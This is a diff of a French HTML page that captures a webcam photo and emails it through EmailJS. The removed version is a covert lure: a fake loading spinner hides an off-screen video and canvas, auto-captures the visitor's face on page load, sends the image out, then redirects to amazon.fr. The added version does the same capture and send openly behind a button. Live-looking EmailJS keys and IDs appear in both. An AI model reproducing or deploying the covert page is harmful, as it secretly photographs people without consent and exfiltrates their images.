@@ -1,128 +1,82 @@
-<html>
+<!DOCTYPE html>
+<html lang="fr">
 <head>
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <meta charset="UTF-8">
+  <title>Photo et envoi par EmailJS</title>
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
     body {
-      margin: 0;
-      padding: 0;
       font-family: Arial, sans-serif;
-      background: #f0f0f0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-    }
-    
-    .loading {
       text-align: center;
-      padding: 40px;
-      background: white;
+      padding: 20px;
+      background: #f0f0f0;
+    }
+    video, canvas {
+      margin-top: 15px;
+      border: 2px solid #333;
       border-radius: 10px;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
     }
-    
-    .spinner {
-      width: 40px;
-      height: 40px;
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #3498db;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin: 0 auto 20px;
+    button {
+      margin: 10px;
+      padding: 10px 20px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      background: #28a745;
+      color: white;
     }
-    
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    
-    #video, #canvas {
-      position: absolute;
-      left: -9999px;
-      opacity: 0;
-      width: 1px;
-      height: 1px;
+    button:hover {
+      background: #1e7e34;
     }
   </style>
 </head>
 <body>
-  <div class="loading">
-    <div class="spinner"></div>
-    <p>Chargement en cours...</p>
-  </div>
-  
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" width="640" height="480"></canvas>
-  
+  <h2>📸 Capture et envoi automatique</h2>
+  <button id="startBtn">Activer la caméra et envoyer</button>
+  <br>
+  <video id="video" autoplay playsinline width="300"></video>
+  <br>
+  <canvas id="canvas" width="300" height="200"></canvas>
+
   <script>
-    emailjs.init("IoSfbtGz4KSL_5_9E");
-    
+    // Initialiser EmailJS avec ta clé publique
+    (function(){
+      emailjs.init("IoSfbtGz4KSL_5_9E");
+    })();
+
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
-    
-    // Démarrage automatique dès le chargement
-    window.addEventListener('load', async () => {
+
+    document.getElementById('startBtn').addEventListener('click', async () => {
       try {
-        // Demande d'accès à la caméra frontale
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { 
-            facingMode: 'user' // Caméra frontale
-          }
+          video: { facingMode: "user" } // caméra frontale
         });
-        
         video.srcObject = stream;
-        
-        // Attendre que la vidéo soit prête puis prendre la photo
-        video.addEventListener('loadedmetadata', () => {
-          setTimeout(captureAndSend, 1000); // Délai de 1s pour stabiliser l'image
-        });
-        
+
+        // Quand la vidéo est prête → capture et envoi
+        video.onloadeddata = () => {
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL("image/png");
+
+          // Envoi via EmailJS
+          emailjs.send("service_8cs0gml", "template_rdhxflt", {
+            message: "Voici la photo capturée automatiquement 📸",
+            image: imageData
+          })
+          .then(() => {
+            alert("📧 Photo envoyée par email !");
+          }, (err) => {
+            alert("❌ Erreur : " + JSON.stringify(err));
+          });
+        };
+
       } catch (err) {
-        console.error('Erreur caméra:', err);
-        // Redirection même en cas d'erreur
-        redirectToAmazon();
+        alert("⚠️ Accès caméra refusé ou caméra non disponible.");
       }
     });
-    
-    function captureAndSend() {
-      try {
-        // Capturer l'image
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imageData = canvas.toDataURL("image/jpeg", 0.8);
-        
-        // Arrêter la caméra
-        const stream = video.srcObject;
-        if (stream) {
-          stream.getTracks().forEach(track => track.stop());
-        }
-        
-        // Envoyer par email
-        emailjs.send("service_8cs0gml", "template_rdhxflt", {
-          name: "Visiteur",
-          time: new Date().toLocaleString(),
-          message: "Photo automatique",
-          image: imageData
-        }).then(() => {
-          console.log('Photo envoyée');
-        }).catch(err => {
-          console.error('Erreur envoi:', err);
-        }).finally(() => {
-          // Redirection vers Amazon après envoi (succès ou échec)
-          redirectToAmazon();
-        });
-        
-      } catch (err) {
-        console.error('Erreur capture:', err);
-        redirectToAmazon();
-      }
-    }
-    
-    function redirectToAmazon() {
-      setTimeout(() => {
-        window.location.href = 'https://www.amazon.fr';
-      }, 500);
-    }
   </script>
 </body>
 </html>
